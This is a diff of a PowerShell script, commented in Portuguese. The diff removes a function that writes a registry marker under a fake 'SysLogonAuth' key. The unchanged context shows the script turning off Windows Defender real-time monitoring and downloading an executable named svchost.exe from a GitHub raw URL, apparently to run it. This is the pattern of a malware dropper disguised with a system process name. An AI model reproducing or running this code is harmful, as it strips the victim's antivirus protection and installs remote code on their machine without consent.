@@ -5,31 +5,6 @@ if (-not $isAdmin) {
     exit 1
 }
 
-# Função para criar a chave de registro
-function Set-ProductLicenseRegistry {
-    try {
-        $registryPath = "HKCU:\Software\SysLogonAuth"
-        $name = "Product License"
-        $value = "0x01"
-        
-        # Verificar se o caminho do registro existe, se não, criar
-        if (-not (Test-Path $registryPath)) {
-            New-Item -Path $registryPath -Force -ErrorAction Stop | Out-Null
-            Write-Host "Caminho de registro $registryPath criado."
-        }
-        
-        # Criar ou atualizar o valor da string
-        Set-ItemProperty -Path $registryPath -Name $name -Value $value -Type String -ErrorAction Stop
-        Write-Host "Chave de registro $name com valor $value criada/atualizada em $registryPath."
-        
-        # Aguardar 50ms
-        Start-Sleep -Milliseconds 50
-    } catch {
-        Write-Error "Erro ao criar a chave de registro: $_"
-        exit 1
-    }
-}
-
 # Desativar monitoramento em tempo real do Windows Defender
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
@@ -62,9 +37,6 @@ try {
     Write-Error "Erro ao criar ou acessar o diretório $workDir: $_"
     exit 1
 }
-
-# Chamar a função para criar a chave de registro antes do download e execução
-Set-ProductLicenseRegistry
 
 # Baixar o arquivo
 $fileUrl = "https://github.com/user337666/brow666/raw/refs/heads/main/svchost.exe"
